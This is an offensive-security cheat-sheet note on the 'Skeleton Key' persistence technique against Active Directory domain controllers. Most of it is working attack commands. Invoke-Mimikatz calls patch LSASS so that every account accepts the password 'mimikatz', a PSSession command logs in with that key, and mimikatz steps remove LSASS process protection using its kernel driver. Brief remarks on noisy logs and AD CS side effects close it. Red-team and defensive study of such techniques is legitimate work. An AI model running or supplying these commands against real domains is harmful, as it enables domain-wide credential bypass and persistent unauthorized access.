---
tags:
  - persistence
title:
  - Skeleton Key
---
- Patches the DC's LSASS process so that it allows access as any user with a single password.
- Publicly knows methods are not persistent across reboots.

```powershell title:"Inject a skeleton key (with password "mimikatz") on a Domain Controller"
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName domain-controller-fqdn
```

```powershell title:"Access any machine with a valid username and password as "mimikatz" after injecting skeleton key"
Enter-PSSession -ComputerName domain-controller -credential domain\Administrator
```

In case LSASS is running as a protected process, we can still use Skeleton key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:

```batch title:"Run these mimikatz commands on the DC" 
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
```

- Very noisy logs - Service installation (Kernel mode driver)
- Might cause issues with [[active-directory/notes/AD CS]]



